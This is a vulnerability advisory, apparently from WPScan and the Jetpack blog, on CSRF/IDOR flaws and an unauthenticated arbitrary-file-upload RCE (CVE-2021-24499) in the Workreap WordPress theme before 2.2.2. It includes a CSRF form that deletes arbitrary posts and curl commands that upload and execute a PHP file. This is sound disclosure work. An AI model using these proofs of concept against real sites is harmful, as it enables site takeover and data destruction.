## Themes Vulnerabilities

# Workreap < 2.2.2 - Multiple CSRF + IDOR Vulnerabilities

### Description

Several AJAX actions available in the theme lacked CSRF protections, as well as allowing insecure direct object references that were not validated. This allows an attacker to trick a logged in user to submit a POST request to the vulnerable site, potentially modifying or deleting arbitrary objects on the target site.

### Proof of Concept

<form action="http://localhost:8888/wp-admin/admin-ajax.php" method="POST">
<input name="action" type="hidden" value="workreap\_portfolio\_remove">
<!-- note value does not have to be a portfolio, any post id will do -->
<input name="id" type="hidden" value="1361">
<input type="submit" value="Get rich!">
</form>

# Multiple vulnerabilities in Workreap theme by Amentotech

Updated on August 3, 2021 - Harald Eilertsen

Recently the Jetpack team found some infected files in one of our hosted customers’ sites, and quickly traced the source of infection back to the [Workreap theme by Amentotech](https://themeforest.net/item/workreap-freelance-marketplace-wordpress-theme/23712454). We started an investigation and uncovered a number of vulnerable AJAX endpoints in the theme; the most severe of these was an unauthenticated unvalidated upload vulnerability potentially leading to remote code execution and a full site takeover.

We reported the vulnerabilities to the Amentotech team via the Envato Helpful Hacker program, and the issues were addressed promptly by them. Version 2.2.2 of the theme was released on June 29, 2021 that fixes the found vulnerabilities.

## TL;DR

Due to the seriousness of the vulnerabilities, we highly recommend all users of the Workreap theme to upgrade to version 2.2.2 or later as soon as possible.

Download the upgrade from the [theme website](https://themeforest.net/item/workreap-freelance-marketplace-wordpress-theme/23712454) and install it manually, or upgrade automatically via the Envato market plugin.

## Details

**Theme Name:** Workreap
**Theme URI:** <http://amentotech.com/projects/wpworkreap>
**Author:** Amentotech
**Author URI:**  <https://themeforest.net/user/amentotech/portfolio>

## The Vulnerabilities

Due to the seriousness of the vulnerabilities, we will delay posting proof of concept and complete analysis to give users time to upgrade.

### Unauthenticated upload leading to remote code execution

**Affected Versions:** < 2.2.2
**CVE-ID:** CVE-2021-24499
**CVSSv3.1:** [10.0](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
**CWE:** [CWE-284](https://cwe.mitre.org/data/definitions/284.html), [CWE-641](https://cwe.mitre.org/data/definitions/641.html),
**CWSS:** [90.7](https://www.cwss-score.info/#TI:C,1/AP:A,1/AL:S,0.9/IC:N,1/FC:T,1/RP:N,1/RL:NA,1/AV:I,1/AS:N,1/IN:A,1/SC:A,1/BI:C,1/DI:M,0.6/EX:H,1/EC:N,1/P:H,0.9/)
**WPScan link:** <https://wpscan.com/vulnerability/74611d5f-afba-42ae-bc19-777cdf2808cb>

The AJAX actions `workreap_award_temp_file_uploader` and `workreap_temp_file_uploader` did not perform nonce checks, or validate that the request is from a valid user in any other way. The endpoints allowed for uploading arbitrary files to the `uploads/workreap-temp` directory. Uploaded files were neither sanitized nor validated, allowing an unauthenticated visitor to upload executable code such as php scripts.

**Proof of concept**

```

% curl -F 'action=workreap_award_temp_file_uploader' -F award_img=@malicious.php 'https://example.com/wp-admin/admin-ajax.php'
{"type":"success","message":"File uploaded!","thumbnail":"https:\/\/example.com\/wp-content\/uploads\/workreap-temp\/malicious.php","name":"malicious.php","size":"24.00 B"}

% curl 'https://example.com/wp-content/uploads/workreap-temp/malicious.php'
PWNED!

```
